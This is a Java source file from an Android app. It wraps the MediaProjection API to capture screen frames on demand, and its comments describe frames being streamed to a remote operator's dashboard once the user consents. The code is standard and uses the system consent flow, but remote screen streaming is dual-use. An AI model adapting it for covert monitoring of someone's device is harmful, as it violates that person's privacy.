package com.task.tusker.commands;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import java.nio.ByteBuffer;

/**
 * Singleton that holds an active {@link MediaProjection} session and delivers
 * on-demand screen frames via a {@link VirtualDisplay} + {@link ImageReader}.
 *
 * <h3>Lifecycle</h3>
 * <ol>
 *   <li>Operator sends {@code request_screen_capture_permission} from the dashboard.</li>
 *   <li>Device launches {@link com.task.tusker.MediaProjectionConsentActivity}.</li>
 *   <li>User approves the system "Start recording?" prompt.</li>
 *   <li>{@link #start(Context, int, Intent)} is called with the consent result.</li>
 *   <li>{@link #captureFrame()} returns live screen {@link Bitmap}s for the stream loop.</li>
 *   <li>Session persists until the user stops it via the system notification chip,
 *       {@link #release()} is called, or the process is killed.</li>
 * </ol>
 *
 * <p>Capture resolution is halved relative to the display to keep frame encoding lightweight.
 * {@code SocketManager.captureFrame()} will compress this further before sending over the wire.</p>
 */
public class MediaProjectionHolder {

    private static final String TAG         = "MediaProjectionHolder";
    /** Capture at half the display's native resolution — good balance of clarity and bandwidth. */
    private static final int    SCALE_DENOM = 2;

    private static final MediaProjectionHolder INSTANCE = new MediaProjectionHolder();

    public static MediaProjectionHolder getInstance() {
        return INSTANCE;
    }

    private MediaProjectionHolder() {}

    // ── State (all accesses synchronized on this) ─────────────────────────

    private MediaProjection mediaProjection;
    private VirtualDisplay  virtualDisplay;
    private ImageReader     imageReader;
    private int             captureW;
    private int             captureH;

    // ── Public API ────────────────────────────────────────────────────────

    /**
     * Initialize a new projection session using the result from
     * {@link MediaProjectionManager#createScreenCaptureIntent()}.
     * Any previous session is torn down first.
     *
     * @param context    application context
     * @param resultCode result code returned by the consent activity ({@code RESULT_OK})
     * @param data       data intent returned by the consent activity
     */
    public synchronized void start(Context context, int resultCode, Intent data) {
        release(); // always tear down any prior session
        try {
            MediaProjectionManager mpm = (MediaProjectionManager)
                    context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm == null) {
                Log.e(TAG, "MediaProjectionManager unavailable on this device");
                return;
            }

            mediaProjection = mpm.getMediaProjection(resultCode, data);
            if (mediaProjection == null) {
                Log.e(TAG, "getMediaProjection returned null — result was likely denied");
                return;
            }

            // Clean up gracefully when the user taps "Stop" on the system notification chip
            mediaProjection.registerCallback(new MediaProjection.Callback() {
                @Override
                public void onStop() {
                    Log.i(TAG, "MediaProjection stopped by system or user");
                    synchronized (MediaProjectionHolder.this) { cleanup(); }
                }
            }, new Handler(Looper.getMainLooper()));

            DisplayMetrics dm = context.getResources().getDisplayMetrics();
            captureW = dm.widthPixels  / SCALE_DENOM;
            captureH = dm.heightPixels / SCALE_DENOM;

            // 2-slot ImageReader — acquireLatestImage() always delivers the most current frame
            imageReader = ImageReader.newInstance(captureW, captureH, PixelFormat.RGBA_8888, 2);

            virtualDisplay = mediaProjection.createVirtualDisplay(
                    "mpCapture",
                    captureW, captureH, dm.densityDpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(),
                    null, null);

            Log.i(TAG, "MediaProjection session started — capture size: "
                    + captureW + "×" + captureH);
        } catch (Exception e) {
            Log.e(TAG, "start() failed: " + e.getMessage());
            cleanup();
        }
    }

    /**
     * Capture the current screen content and return it as a {@link Bitmap}.
     *
     * @return the latest screen frame, or {@code null} if no session is active or
     *         no frame has been rendered into the virtual display yet.
     */
    public synchronized Bitmap captureFrame() {
        if (imageReader == null) return null;
        Image image = null;
        try {
            image = imageReader.acquireLatestImage();
            if (image == null) return null; // no frame available yet

            Image.Plane plane     = image.getPlanes()[0];
            ByteBuffer  buffer    = plane.getBuffer();
            int         rowStride = plane.getRowStride();
            int         pixStride = plane.getPixelStride();
            int         rowPad    = rowStride - pixStride * captureW;

            Bitmap raw = Bitmap.createBitmap(
                    captureW + rowPad / pixStride, captureH, Bitmap.Config.ARGB_8888);
            raw.copyPixelsFromBuffer(buffer);

            // Crop off any row-padding columns so the Bitmap is exactly captureW wide
            if (raw.getWidth() != captureW) {
                Bitmap cropped = Bitmap.createBitmap(raw, 0, 0, captureW, captureH);
                raw.recycle();
                return cropped;
            }
            return raw;
        } catch (Exception e) {
            Log.w(TAG, "captureFrame error: " + e.getMessage());
            return null;
        } finally {
            if (image != null) {
                try { image.close(); } catch (Exception ignored) {}
            }
        }
    }

    /**
     * Returns {@code true} when a projection session is active and frames can be captured.
     * Check this before deciding whether to show "requires screen capture consent" UI.
     */
    public synchronized boolean isAvailable() {
        return mediaProjection != null && imageReader != null && virtualDisplay != null;
    }

    /**
     * Tear down the active session and release all resources.
     * Safe to call multiple times or when no session exists.
     */
    public synchronized void release() {
        cleanup();
    }

    // ── Internals ─────────────────────────────────────────────────────────

    private void cleanup() {
        if (virtualDisplay != null) {
            try { virtualDisplay.release(); } catch (Exception ignored) {}
            virtualDisplay = null;
        }
        if (imageReader != null) {
            try { imageReader.close(); } catch (Exception ignored) {}
            imageReader = null;
        }
        if (mediaProjection != null) {
            try { mediaProjection.stop(); } catch (Exception ignored) {}
            mediaProjection = null;
        }
    }
}
